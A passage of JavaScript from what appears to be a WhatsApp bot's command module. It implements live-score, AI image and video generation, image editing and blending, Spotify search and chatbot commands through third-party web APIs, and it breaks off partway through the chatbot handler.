      // ==========================================================
      // Send the message
      // ==========================================================
      await sock.sendMessage(from, { text: msg });

    } catch (error) {
      console.error('Scores error:', error);

      // ==========================================================
      // Fallback: Try alternative endpoints
      // ==========================================================
      const fallbacks = [
        'https://api.giftedtech.co.ke/api/football/livescore2?apikey=gifted',
        'https://api.princetechn.com/api/tools/scores?apikey=prince',
        'https://apis.davidcyril.name.ng/sports/football'
      ];

      for (const fallbackUrl of fallbacks) {
        try {
          const fallbackRes = await fetch(fallbackUrl, {
            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
          });

          if (fallbackRes.ok) {
            const fallbackData = await fallbackRes.json();
            let fallbackMatches = fallbackData.result?.matches || 
                                 fallbackData.matches || 
                                 fallbackData.data || 
                                 fallbackData.fixtures || [];

            if (fallbackMatches && fallbackMatches.length > 0) {
              let msg = `⚽ *Live Scores (fallback)*\n\n`;
              const filtered = filter ? fallbackMatches.filter(m => {
                const league = (m.league || m.competition || '').toLowerCase();
                const home = (m.homeTeam || m.home || '').toLowerCase();
                const away = (m.awayTeam || m.away || '').toLowerCase();
                return league.includes(filter) || home.includes(filter) || away.includes(filter);
              }) : fallbackMatches;

              const display = (filter && filtered.length > 0) ? filtered : fallbackMatches;
              const limit = Math.min(display.length, 15);

              for (let i = 0; i < limit; i++) {
                const m = display[i];
                const home = m.homeTeam || m.home || 'Unknown';
                const away = m.awayTeam || m.away || 'Unknown';
                const score = m.score || `${m.homeScore || 0} - ${m.awayScore || 0}`;
                const league = m.league || m.competition || 'Unknown League';
                msg += `*${league}*\n${home} ${score} ${away}\n\n`;
              }

              if (filter && filtered.length === 0) {
                msg = `❌ No matches found for "${filter}". Try a different filter.`;
              }

              return await sock.sendMessage(from, { text: msg });
            }
          }
        } catch (fallbackErr) {
          console.warn(`Fallback ${fallbackUrl} failed:`, fallbackErr.message);
        }
      }

      // ==========================================================
      // All fallbacks failed
      // ==========================================================
      await sock.sendMessage(from, { 
        text: `⚠️ Could not fetch live scores: ${error.message || 'Unknown error'}\n\n💡 Try:\n• ${prefix}${command} premier league\n• ${prefix}${command} la liga\n• ${prefix}${command} manchester united\n\n💡 Or try again in a few minutes.` 
      });
    }
  }
});
register({
  name: 'nanobanana',
  aliases: ['nano', 'bananaimg', 'nanobanana2', 'nbanana', 'txt2img'],
  category: 'AI',
  description: 'Generate AI images from text prompts using NanoBanana 2',
  async execute({ sock, from, args, prefix, command }) {
    // ==========================================================
    // Check if user provided a prompt
    // ==========================================================
    if (!args[0]) {
      return await sock.sendMessage(from, { 
        text: `🍌 *NanoBanana 2 - AI Image Generator*\n\nUsage: ${prefix}${command} <prompt>\nExample: ${prefix}${command} A cow in city\n\n*Examples:*\n${prefix}${command} A beautiful sunset over mountains\n${prefix}${command} A cyberpunk city at night\n${prefix}${command} A cat wearing a wizard hat\n${prefix}${command} A floating island in space\n\n*Note:* Generates high-quality images using NanoBanana Pro.` 
      });
    }

    const prompt = args.join(" ");

    await sock.sendMessage(from, { 
      text: `🍌 *Generating image...*\n📝 *Prompt:* ${prompt}\n⏳ This may take 10-20 seconds...` 
    });

    try {
      // ==========================================================
      // Call NanoBanana Pro API
      // ==========================================================
      const baseUrl = 'https://omegatech-api.dixonomega.tech';
      const apiUrl = new URL(`${baseUrl}/api/ai/nano-banana-pro`);
      apiUrl.searchParams.append('prompt', prompt);

      const response = await fetch(apiUrl.toString(), {
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept': 'application/json'
        }
      });

      if (!response.ok) {
        throw new Error(`API returned ${response.status}`);
      }

      const data = await response.json();

      // ==========================================================
      // Check if generation was successful
      // ==========================================================
      if (!data.success) {
        return await sock.sendMessage(from, { 
          text: `❌ Image generation failed: ${data.message || 'Unknown error'}` 
        });
      }

      // ==========================================================
      // Extract image URL
      // ==========================================================
      const imageUrl = data.image || data.result?.image || data.result?.url || data.url;

      if (!imageUrl) {
        return await sock.sendMessage(from, { 
          text: `❌ No image URL returned from the API.` 
        });
      }

      // ==========================================================
      // Download the image
      // ==========================================================
      const imageResponse = await fetch(imageUrl, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      if (!imageResponse.ok) {
        throw new Error(`Failed to download image: ${imageResponse.status}`);
      }

      const imageBuffer = Buffer.from(await imageResponse.arrayBuffer());

      if (imageBuffer.length < 1000) {
        return await sock.sendMessage(from, { 
          text: `❌ Generated image is too small. Please try again.` 
        });
      }

      const fileSize = (imageBuffer.length / 1024).toFixed(1);

      // ==========================================================
      // Send the image
      // ==========================================================
      const model = data.model || 'NanoBanana 2';
      const timestamp = data.timestamp ? new Date(data.timestamp).toLocaleString() : 'Just now';

      await sock.sendMessage(from, {
        image: imageBuffer,
        caption: `🍌 *${model}*\n\n📝 *Prompt:* ${prompt}\n📦 *Size:* ${fileSize} KB\n🕐 *Generated:* ${timestamp}\n\n✅ *Image Generated Successfully*\n\n✨ _Powered by OmegaTech_`
      });

    } catch (error) {
      console.error('NanoBanana error:', error);
      await sock.sendMessage(from, { 
        text: `⚠️ Error: ${error.message || 'Could not generate image.'}\n\n💡 Try:\n• A different prompt\n• A shorter prompt\n• ${prefix}${command} a cat sitting on a chair\n• ${prefix}${command} beautiful landscape\n\n💡 Or try again later.` 
      });
    }
  }
});
register({
  name: 'nanoedit',
  aliases: ['editimage', 'nanoe', 'imageedit', 'nanoeditor'],
  category: 'AI',
  description: 'Edit images using AI (NanoBanana 2) - reply to an image',
  async execute({ sock, from, msg, quoted, args, prefix, command }) {
    // ==========================================================
    // Check if user provided a prompt
    // ==========================================================
    if (!args[0]) {
      return await sock.sendMessage(from, { 
        text: `🍌 *NanoBanana 2 - AI Image Editor*\n\nUsage: Reply to an image with: ${prefix}${command} <prompt>\n\n*Examples:*\n${prefix}${command} Edit this to nice picture and good theme\n${prefix}${command} Make this look like a painting\n${prefix}${command} Add a sunset background\n${prefix}${command} Turn this into anime style\n${prefix}${command} Remove the background\n\n*Note:* The AI will edit the replied image according to your prompt.` 
      });
    }

    const prompt = args.join(" ");
    const target = quoted || msg;

    // ==========================================================
    // Check if replying to an image
    // ==========================================================
    let imageUrl = null;

    // Check for image in quoted message
    if (target.message?.imageMessage) {
      imageUrl = target.message.imageMessage.url || target.message.imageMessage.caption;
    } else if (target.message?.documentMessage?.mimetype?.includes('image')) {
      imageUrl = target.message.documentMessage.url;
    } else if (target.message?.stickerMessage) {
      imageUrl = target.message.stickerMessage.url;
    } else if (target.message?.videoMessage) {
      imageUrl = target.message.videoMessage.url;
    }

    if (!imageUrl) {
      return await sock.sendMessage(from, { 
        text: `❌ Reply to an *image* with: ${prefix}${command} <prompt>\n\nExample: Reply to a photo with:\n${prefix}${command} Edit this to nice picture and good theme` 
      });
    }

    await sock.sendMessage(from, { 
      text: `🍌 *Editing image...*\n📝 *Prompt:* ${prompt}\n⏳ This may take 10-30 seconds...` 
    });

    try {
      // ==========================================================
      // Call NanoBanana 2 Edit API
      // ==========================================================
      const baseUrl = 'https://omegatech-api.dixonomega.tech';
      const apiUrl = new URL(`${baseUrl}/api/ai/nano-banana2`);
      apiUrl.searchParams.append('image', imageUrl);
      apiUrl.searchParams.append('prompt', prompt);

      const response = await fetch(apiUrl.toString(), {
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept': 'application/json'
        }
      });

      if (!response.ok) {
        throw new Error(`API returned ${response.status}`);
      }

      const data = await response.json();

      // ==========================================================
      // Check if editing was successful
      // ==========================================================
      if (!data.success) {
        return await sock.sendMessage(from, { 
          text: `❌ Image editing failed: ${data.message || 'Unknown error'}` 
        });
      }

      // ==========================================================
      // Extract task ID and wait for completion
      // ==========================================================
      const taskId = data.task_id || data.taskId || data.id;

      if (!taskId) {
        return await sock.sendMessage(from, { 
          text: `❌ No task ID returned from the API.` 
        });
      }

      // ==========================================================
      // Check status with retry
      // ==========================================================
      await sock.sendMessage(from, { 
        text: `⏳ *Processing...* (Task ID: ${taskId.slice(0, 8)})\nThis may take up to 60 seconds...` 
      });

      let editedImage = null;
      let attempts = 0;
      const maxAttempts = 12;

      while (attempts < maxAttempts) {
        attempts++;
        await new Promise(r => setTimeout(r, 5000)); // Wait 5 seconds between checks

        try {
          const statusUrl = new URL(`${baseUrl}/api/ai/nano-banana2/status`);
          statusUrl.searchParams.append('task_id', taskId);

          const statusRes = await fetch(statusUrl.toString(), {
            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
          });

          if (statusRes.ok) {
            const statusData = await statusRes.json();
            
            if (statusData.status === 'completed' || statusData.success) {
              editedImage = statusData.result?.image || statusData.result?.url || statusData.image || statusData.url;
              break;
            } else if (statusData.status === 'failed' || statusData.status === 'error') {
              throw new Error(statusData.message || 'Editing failed');
            }
          }
        } catch (e) {
          // Continue retrying
        }

        if (attempts < maxAttempts) {
          await sock.sendMessage(from, { 
            text: `⏳ *Still processing...* (${attempts}/${maxAttempts})` 
          });
        }
      }

      // ==========================================================
      // If we didn't get an image, try to get it from the initial response
      // ==========================================================
      if (!editedImage) {
        // Some APIs return the image directly in the initial response
        editedImage = data.result?.image || data.result?.url || data.image || data.url;
      }

      if (!editedImage) {
        return await sock.sendMessage(from, { 
          text: `❌ Could not retrieve the edited image.\n\nTask ID: ${taskId}\n💡 Try again or check the status later.` 
        });
      }

      // ==========================================================
      // Download the edited image
      // ==========================================================
      const imageResponse = await fetch(editedImage, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      if (!imageResponse.ok) {
        throw new Error(`Failed to download edited image: ${imageResponse.status}`);
      }

      const imageBuffer = Buffer.from(await imageResponse.arrayBuffer());

      if (imageBuffer.length < 1000) {
        return await sock.sendMessage(from, { 
          text: `❌ Edited image is too small. Please try again.` 
        });
      }

      const fileSize = (imageBuffer.length / 1024).toFixed(1);

      // ==========================================================
      // Send the edited image
      // ==========================================================
      const timestamp = data.timestamp ? new Date(data.timestamp).toLocaleString() : 'Just now';

      await sock.sendMessage(from, {
        image: imageBuffer,
        caption: `🍌 *NanoBanana 2 - Image Edit*\n\n📝 *Prompt:* ${prompt}\n📦 *Size:* ${fileSize} KB\n🕐 *Generated:* ${timestamp}\n🆔 *Task ID:* ${taskId.slice(0, 12)}...\n\n✅ *Image Edited Successfully*\n\n✨ _Powered by OmegaTech_`
      });

    } catch (error) {
      console.error('NanoEdit error:', error);
      await sock.sendMessage(from, { 
        text: `⚠️ Error: ${error.message || 'Could not edit image.'}\n\n💡 Try:\n• A different prompt\n• A clearer image\n• ${prefix}${command} Make it look like a painting\n• ${prefix}${command} Add a sunset background\n\n💡 Or try again later.` 
      });
    }
  }
});
register({
  name: 'spotify',
  aliases: ['sp', 'spsearch', 'spotifydl', 'spotifysearch'],
  category: 'DOWNLOADER',
  description: 'Search Spotify tracks and get preview audio',
  async execute({ sock, from, args, prefix, command }) {
    // ==========================================================
    // Check if user provided a search query
    // ==========================================================
    if (!args[0]) {
      return await sock.sendMessage(from, { 
        text: `🎵 *Spotify Search & Preview*\n\nUsage: ${prefix}${command} <song/artist>\nExample: ${prefix}${command} Alone\n\n*Examples:*\n${prefix}${command} Shape of You\n${prefix}${command} Drake\n${prefix}${command} Bohemian Rhapsody\n${prefix}${command} Blinding Lights\n\n*Note:* Returns top 5 results with 30-second previews.` 
      });
    }

    const query = args.join(" ");

    await sock.sendMessage(from, { 
      text: `🎵 *Searching Spotify for:* ${query}` 
    });

    try {
      // ==========================================================
      // Call Spotify Search API
      // ==========================================================
      const baseUrl = 'https://omegatech-api.dixonomega.tech';
      const apiUrl = new URL(`${baseUrl}/api/Search/Spotify`);
      apiUrl.searchParams.append('query', query);
      apiUrl.searchParams.append('type', 'tracks');
      apiUrl.searchParams.append('preview', 'true');

      const response = await fetch(apiUrl.toString(), {
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept': 'application/json'
        }
      });

      if (!response.ok) {
        throw new Error(`API returned ${response.status}`);
      }

      const data = await response.json();

      // ==========================================================
      // Check if search was successful
      // ==========================================================
      if (!data.success) {
        return await sock.sendMessage(from, { 
          text: `❌ Search failed: ${data.message || 'Unknown error'}` 
        });
      }

      const tracks = data.tracks || [];
      
      if (!tracks.length) {
        return await sock.sendMessage(from, { 
          text: `❌ No results found for "${query}".` 
        });
      }

      // ==========================================================
      // Build and send results
      // ==========================================================
      const maxResults = Math.min(tracks.length, 5);
      
      for (let i = 0; i < maxResults; i++) {
        const track = tracks[i];
        
        const title = track.title || 'Unknown';
        const artist = track.artist || 'Unknown';
        const album = track.album || 'Unknown';
        const duration = track.duration || '0:00';
        const explicit = track.explicit ? '🔞' : '✅';
        const thumb = track.thumb || '';
        const url = track.url || '';
        const previewUrl = track.previewUrl || '';

        let msg = `🎵 *${title}*\n`;
        msg += `👤 *Artist:* ${artist}\n`;
        msg += `💿 *Album:* ${album}\n`;
        msg += `⏱️ *Duration:* ${duration}\n`;
        msg += `📌 *Explicit:* ${explicit}\n`;
        msg += `🔗 *Spotify:* ${url}\n\n`;

        if (previewUrl) {
          msg += `🎧 *Preview:* ${previewUrl}`;
        } else {
          msg += `❌ *No preview available*`;
        }

        // Send with thumbnail if available
        if (thumb) {
          try {
            await sock.sendMessage(from, {
              image: { url: thumb },
              caption: msg
            });
          } catch (thumbErr) {
            await sock.sendMessage(from, { text: msg });
          }
        } else {
          await sock.sendMessage(from, { text: msg });
        }

        // Small delay between results
        await new Promise(r => setTimeout(r, 500));
      }

    } catch (error) {
      console.error('Spotify error:', error);
      await sock.sendMessage(from, { 
        text: `⚠️ Error: ${error.message || 'Could not search Spotify.'}\n\n💡 Try:\n• ${prefix}${command} Alone\n• ${prefix}${command} Shape of You\n• ${prefix}${command} Drake\n\n💡 Or try again later.` 
      });
    }
  }
});

register({
  name: 'txt2video',
  aliases: ['t2v', 'textvideo', 'aivideo', 'text2video'],
  category: 'AI',
  description: 'Generate AI videos from text prompts',
  async execute({ sock, from, args, prefix, command }) {
    // ==========================================================
    // Check if user provided a prompt
    // ==========================================================
    if (!args[0]) {
      return await sock.sendMessage(from, { 
        text: `🎬 *Text to Video AI*\n\nUsage: ${prefix}${command} <prompt> [ratio] [sound]\n\n*Examples:*\n${prefix}${command} A cow in city\n${prefix}${command} A beautiful sunset over mountains 16:9\n${prefix}${command} A cyberpunk city at night 9:16\n${prefix}${command} A cat running through a field 1:1\n\n*Options:*\n• ratio: auto, 16:9, 9:16, 1:1, 4:3, 3:4 (default: auto)\n• sound: true, false (default: true)\n\n*Full example:*\n${prefix}${command} A cow in city 16:9 true` 
      });
    }

    // ==========================================================
    // Parse prompt, ratio, and sound
    // ==========================================================
    let prompt = args[0];
    let ratio = 'auto';
    let sound = true;

    // Check if user provided ratio (second argument)
    if (args[1]) {
      const validRatios = ['auto', '16:9', '9:16', '1:1', '4:3', '3:4'];
      if (validRatios.includes(args[1])) {
        ratio = args[1];
        // Check if user provided sound (third argument)
        if (args[2]) {
          sound = args[2].toLowerCase() === 'true';
        }
        prompt = args[0];
      } else {
        // If second arg is not a ratio, treat it as part of the prompt
        prompt = args.join(" ");
        ratio = 'auto';
        sound = true;
      }
    }

    await sock.sendMessage(from, { 
      text: `🎬 *Generating video...*\n📝 *Prompt:* ${prompt}\n📐 *Ratio:* ${ratio}\n🔊 *Sound:* ${sound ? 'On' : 'Off'}\n⏳ This may take 30-60 seconds...` 
    });

    try {
      // ==========================================================
      // Call Txt2video API
      // ==========================================================
      const baseUrl = 'https://omegatech-api.dixonomega.tech';
      const apiUrl = new URL(`${baseUrl}/api/ai/Txt2video`);
      apiUrl.searchParams.append('action', 'generate');
      apiUrl.searchParams.append('prompt', prompt);
      apiUrl.searchParams.append('ratio', ratio);
      apiUrl.searchParams.append('sound', String(sound));

      const response = await fetch(apiUrl.toString(), {
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept': 'application/json'
        }
      });

      if (!response.ok) {
        throw new Error(`API returned ${response.status}`);
      }

      const data = await response.json();

      // ==========================================================
      // Check if generation was successful
      // ==========================================================
      if (!data.success) {
        return await sock.sendMessage(from, { 
          text: `❌ Video generation failed: ${data.message || 'Unknown error'}` 
        });
      }

      // ==========================================================
      // Extract video URL
      // ==========================================================
      const videoUrl = data.data?.videoUrl || data.result?.videoUrl || data.videoUrl || data.url;

      if (!videoUrl) {
        return await sock.sendMessage(from, { 
          text: `❌ No video URL returned from the API.` 
        });
      }

      // ==========================================================
      // Download the video
      // ==========================================================
      const videoResponse = await fetch(videoUrl, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      if (!videoResponse.ok) {
        throw new Error(`Failed to download video: ${videoResponse.status}`);
      }

      const videoBuffer = Buffer.from(await videoResponse.arrayBuffer());

      if (videoBuffer.length < 5000) {
        return await sock.sendMessage(from, { 
          text: `❌ Generated video is too small. Please try again.` 
        });
      }

      const fileSizeMB = (videoBuffer.length / 1024 / 1024).toFixed(2);

      // ==========================================================
      // Send the video
      // ==========================================================
      const timestamp = data.timestamp ? new Date(data.timestamp).toLocaleString() : 'Just now';

      const caption = `🎬 *AI Generated Video*\n\n📝 *Prompt:* ${prompt}\n📐 *Ratio:* ${ratio}\n🔊 *Sound:* ${sound ? 'On ✅' : 'Off ❌'}\n📦 *Size:* ${fileSizeMB} MB\n🕐 *Generated:* ${timestamp}\n\n✅ *Video Generated Successfully*\n\n✨ _Powered by OmegaTech_`;

      // If video is too large (WhatsApp 16MB limit), send as document
      if (videoBuffer.length > 16 * 1024 * 1024) {
        await sock.sendMessage(from, {
          document: videoBuffer,
          mimetype: 'video/mp4',
          fileName: `txt2video_${Date.now()}.mp4`,
          caption: caption + '\n\n⚠️ *Sent as document due to 16MB limit.*'
        });
      } else {
        try {
          await sock.sendMessage(from, {
            video: videoBuffer,
            mimetype: 'video/mp4',
            caption: caption,
            gifPlayback: false
          });
        } catch (sendErr) {
          // Fallback: send as document
          await sock.sendMessage(from, {
            document: videoBuffer,
            mimetype: 'video/mp4',
            fileName: `txt2video_${Date.now()}.mp4`,
            caption: caption
          });
        }
      }

    } catch (error) {
      console.error('Text-to-video error:', error);
      await sock.sendMessage(from, { 
        text: `⚠️ Error: ${error.message || 'Could not generate video.'}\n\n💡 Try:\n• A shorter prompt\n• A different ratio\n• ${prefix}${command} A cow in city 16:9\n• ${prefix}${command} A sunset over mountains\n\n💡 Or try again later.` 
      });
    }
  }
});
register({
  name: 'nanoblend',
  aliases: ['blend', 'mergeimage', 'nano3', 'teamimage'],
  category: 'AI',
  description: 'Blend/merge up to 4 images into one using NanoBanana Pro V3',
  async execute({ sock, from, msg, quoted, args, prefix, command }) {
    // ==========================================================
    // Check if user provided a prompt
    // ==========================================================
    if (!args[0]) {
      return await sock.sendMessage(from, { 
        text: `🍌 *NanoBanana Pro V3 - Image Blender*\n\nUsage: Reply to images with: ${prefix}${command} <prompt>\n\n*Reply to up to 4 images at once:*\n${prefix}${command} Blind and make a nice team image\n\n*Examples:*\n${prefix}${command} Merge these into one cool photo\n${prefix}${command} Combine and make a group picture\n${prefix}${command} Blend these into a team image\n\n*Note:* Reply to 2-4 images in one message. The AI will blend them according to your prompt.` 
      });
    }

    const prompt = args.join(" ");
    const target = quoted || msg;

    // ==========================================================
    // Check for multiple images in the quoted message
    // ==========================================================
    let imageUrls = [];
    let imageIndex = 1;

    // Check for single image
    if (target.message?.imageMessage) {
      const url = target.message.imageMessage.url || target.message.imageMessage.caption;
      if (url) imageUrls.push(url);
    }

    // Check for multiple images in the quoted message (quoted message with multiple images)
    // Note: WhatsApp doesn't support multiple images in a single quote,
    // so users need to reply to a message that already has multiple images,
    // or we collect them from the message context

    // Alternative: Check if the message has multiple image messages in the protocol
    // This handles the case where the user has forwarded a message with multiple images
    if (target.message?.imageMessage && !imageUrls.length) {
      // Try to get more images from the message context
      const ctxInfo = target.message?.imageMessage?.contextInfo;
      if (ctxInfo?.quotedMessage?.imageMessage) {
        const url2 = ctxInfo.quotedMessage.imageMessage.url || ctxInfo.quotedMessage.imageMessage.caption;
        if (url2) imageUrls.push(url2);
      }
    }

    // Check for document messages that are images
    if (target.message?.documentMessage?.mimetype?.includes('image')) {
      const url = target.message.documentMessage.url;
      if (url) imageUrls.push(url);
    }

    // Check for sticker
    if (target.message?.stickerMessage) {
      const url = target.message.stickerMessage.url;
      if (url) imageUrls.push(url);
    }

    // ==========================================================
    // If no images found, try to get from the message context
    // ==========================================================
    if (!imageUrls.length && target.message?.extendedTextMessage?.contextInfo) {
      const ctx = target.message.extendedTextMessage.contextInfo;
      // Check for quoted message images
      if (ctx?.quotedMessage?.imageMessage) {
        const url = ctx.quotedMessage.imageMessage.url || ctx.quotedMessage.imageMessage.caption;
        if (url) imageUrls.push(url);
      }
      // Check for multiple quoted messages (not supported in WhatsApp)
    }

    // ==========================================================
    // Manual check: try to get images from the message chain
    // ==========================================================
    // If the user replied to a message with images, we need to find them
    // WhatsApp only allows quoting one message, so users need to send
    // a message with multiple images (like a media message with multiple attachments)
    // or we need to accept image URLs as arguments instead

    // Alternative: Accept image URLs as arguments
    // Check if any arguments are URLs
    const urlArgs = args.filter(arg => arg.startsWith('http') && (arg.includes('.jpg') || arg.includes('.jpeg') || arg.includes('.png') || arg.includes('.gif') || arg.includes('.webp')));
    if (urlArgs.length) {
      imageUrls = urlArgs;
      // Remove URLs from prompt
      const cleanPrompt = args.filter(arg => !arg.startsWith('http')).join(' ');
      if (cleanPrompt) {
        // Use the cleaned prompt
        // But we already have the prompt from args[0], so we need to rebuild it
        const promptParts = args.filter(arg => !arg.startsWith('http'));
        const newPrompt = promptParts.join(' ');
        // We'll use the original prompt but note that URLs were provided
      }
    }

    // ==========================================================
    // If still no images, ask the user
    // ==========================================================
    if (!imageUrls.length) {
      return await sock.sendMessage(from, { 
        text: `❌ *No images found.*\n\nPlease reply to a message with images, or provide image URLs:\n\n*Usage (with URLs):*\n${prefix}${command} <prompt> <image_url1> <image_url2> ...\n\n*Example:*\n${prefix}${command} Make a team image https://example.com/img1.jpg https://example.com/img2.jpg\n\n*Or reply to:*\n• A message with 2-4 images\n• A single image message\n• A document image` 
      });
    }

    // Limit to 4 images
    if (imageUrls.length > 4) {
      imageUrls = imageUrls.slice(0, 4);
    }

    if (imageUrls.length < 2) {
      return await sock.sendMessage(from, { 
        text: `❌ *Need at least 2 images.*\n\nFound only ${imageUrls.length} image(s).\n\nPlease provide 2-4 images to blend.\n\n${prefix}${command} <prompt> <url1> <url2>\nExample: ${prefix}${command} Make a team image https://example.com/1.jpg https://example.com/2.jpg` 
      });
    }

    await sock.sendMessage(from, { 
      text: `🍌 *Blending images...*\n📝 *Prompt:* ${prompt}\n📊 *Images:* ${imageUrls.length}\n⏳ This may take 20-40 seconds...` 
    });

    try {
      // ==========================================================
      // Call NanoBanana Pro V3 API
      // ==========================================================
      const baseUrl = 'https://omegatech-api.dixonomega.tech';
      const apiUrl = new URL(`${baseUrl}/api/ai/nanobana-pro-v3`);
      
      // Add images to the request
      imageUrls.forEach((url, index) => {
        apiUrl.searchParams.append(`image${index + 1}`, url);
      });
      
      apiUrl.searchParams.append('prompt', prompt);

      const response = await fetch(apiUrl.toString(), {
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept': 'application/json'
        }
      });

      if (!response.ok) {
        throw new Error(`API returned ${response.status}`);
      }

      const data = await response.json();

      // ==========================================================
      // Check if blending was successful
      // ==========================================================
      if (!data.success) {
        return await sock.sendMessage(from, { 
          text: `❌ Image blending failed: ${data.message || 'Unknown error'}` 
        });
      }

      // ==========================================================
      // Extract task ID and wait for completion
      // ==========================================================
      const taskId = data.task_id || data.taskId || data.id;

      if (!taskId) {
        return await sock.sendMessage(from, { 
          text: `❌ No task ID returned from the API.` 
        });
      }

      await sock.sendMessage(from, { 
        text: `⏳ *Processing...* (Task ID: ${taskId.slice(0, 8)})\nThis may take up to 60 seconds...` 
      });

      let blendedImage = null;
      let attempts = 0;
      const maxAttempts = 12;

      while (attempts < maxAttempts) {
        attempts++;
        await new Promise(r => setTimeout(r, 5000));

        try {
          const statusUrl = new URL(`${baseUrl}/api/ai/nanobana-pro-v3/status`);
          statusUrl.searchParams.append('task_id', taskId);

          const statusRes = await fetch(statusUrl.toString(), {
            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
          });

          if (statusRes.ok) {
            const statusData = await statusRes.json();
            
            if (statusData.status === 'completed' || statusData.success) {
              blendedImage = statusData.result?.image || statusData.result?.url || statusData.image || statusData.url;
              break;
            } else if (statusData.status === 'failed' || statusData.status === 'error') {
              throw new Error(statusData.message || 'Blending failed');
            }
          }
        } catch (e) {
          // Continue retrying
        }

        if (attempts < maxAttempts) {
          await sock.sendMessage(from, { 
            text: `⏳ *Still processing...* (${attempts}/${maxAttempts})` 
          });
        }
      }

      // ==========================================================
      // If we didn't get an image, try to get it from the initial response
      // ==========================================================
      if (!blendedImage) {
        blendedImage = data.result?.image || data.result?.url || data.image || data.url;
      }

      if (!blendedImage) {
        return await sock.sendMessage(from, { 
          text: `❌ Could not retrieve the blended image.\n\nTask ID: ${taskId}\n💡 Try again or check the status later.` 
        });
      }

      // ==========================================================
      // Download the blended image
      // ==========================================================
      const imageResponse = await fetch(blendedImage, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      if (!imageResponse.ok) {
        throw new Error(`Failed to download blended image: ${imageResponse.status}`);
      }

      const imageBuffer = Buffer.from(await imageResponse.arrayBuffer());

      if (imageBuffer.length < 1000) {
        return await sock.sendMessage(from, { 
          text: `❌ Blended image is too small. Please try again.` 
        });
      }

      const fileSize = (imageBuffer.length / 1024).toFixed(1);

      // ==========================================================
      // Send the blended image
      // ==========================================================
      const timestamp = data.timestamp ? new Date(data.timestamp).toLocaleString() : 'Just now';

      await sock.sendMessage(from, {
        image: imageBuffer,
        caption: `🍌 *NanoBanana Pro V3 - Image Blend*\n\n📝 *Prompt:* ${prompt}\n📊 *Images used:* ${data.images_used || imageUrls.length}\n📦 *Size:* ${fileSize} KB\n🕐 *Generated:* ${timestamp}\n🆔 *Task ID:* ${taskId.slice(0, 12)}...\n\n✅ *Images Blended Successfully*\n\n✨ _Powered by OmegaTech_`
      });

    } catch (error) {
      console.error('NanoBlend error:', error);
      await sock.sendMessage(from, { 
        text: `⚠️ Error: ${error.message || 'Could not blend images.'}\n\n💡 Try:\n• A different prompt\n• Different images\n• ${prefix}${command} Merge these into one cool photo <url1> <url2>\n• ${prefix}${command} Blend these into a team image <url1> <url2>\n\n💡 Or try again later.` 
      });
    }
  }
});
register({
  name: 'chatbot',
  aliases: ['claude', 'omegaai', 'chat', 'ai'],
  category: 'AI',
  description: 'Chat with Claude AI (OmegaTech) - supports multi-turn conversations',
  async execute({ sock, from, msg, args, prefix, command, sessionId }) {
    // ==========================================================
    // Check if user provided a message
    // ==========================================================
    if (!args[0]) {
      return await sock.sendMessage(from, { 
        text: `🤖 *OmegaTech AI Chatbot*\n\nUsage: ${prefix}${command} <message>\nExample: ${prefix}${command} What is the capital of France?\n\n*Features:*\n• Powered by Claude AI\n• Multi-turn conversations (remembers context)\n• Web search optional\n\n*Commands:*\n${prefix}${command} reset - Clear conversation history\n${prefix}${command} <message> - Chat with AI\n${prefix}${command} <message> --search - Enable web search` 
      });
    }

    const userMessage = args.join(" ");
    const isReset = userMessage.toLowerCase() === 'reset';
    const isSearch = userMessage.includes('--search');

    // Clean message for API (remove --search flag)
    const cleanMessage = userMessage.replace(/\s*--search\s*/, '').trim();

    // ==========================================================
    // Handle reset command
    // ==========================================================
    if (isReset) {
      // Clear session for this user
      const sessionKey = `chatbot_${sessionId || from}`;
      // Using global store or memory - adjust based on your store setup
      if (global.chatSessions) {
        delete global.chatSessions[sessionKey];
      }
      return await sock.sendMessage(from, { 
        text: `🧹 *Chat history cleared.*\nStart a fresh conversation with: ${prefix}${command} Hello` 
      });
    }

    // ==========================================================
    // Generate a session ID for this user
    // ==========================================================
    const userSessionId = sessionId || from.split('@')[0];

    await sock.sendMessage(from, { text: `🤖 *Thinking...*${isSearch ? ' (with web search)' : ''}` });

    try {
      // ==========================================================
      // Call OmegaTech Chatbot API
      // ==========================================================
      const baseUrl = 'https://omegatech-api.dixonomega.tech';
      const apiUrl = new URL(`${baseUrl}/api/ai/Chatbot`);
      
      // Add parameters
      apiUrl.searchParams.append('chat', cleanMessage);
      apiUrl.searchParams.append('sessionId', userSessionId);
      if (isSearch) {
        apiUrl.searchParams.append('web', 'true');
      }

      const response = await fetch(apiUrl.toString(), {
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept': 'application/json'
        }
      });

      if (!response.ok) {
        throw new Error(`API returned ${response.status}`);
      }

      const data = await response.json();

      // ==========================================================
      // Extract response
      // ==========================================================
      let reply = data.result || data.response || data.reply || data.message || data.text;

      if (!reply) {
        // Try to find any text in the response
        const jsonString = JSON.stringify(data);
        const textMatch = jsonString.match(/"result":"([^"]+)"/) || 
                          jsonString.match(/"response":"([^"]+)"/) ||
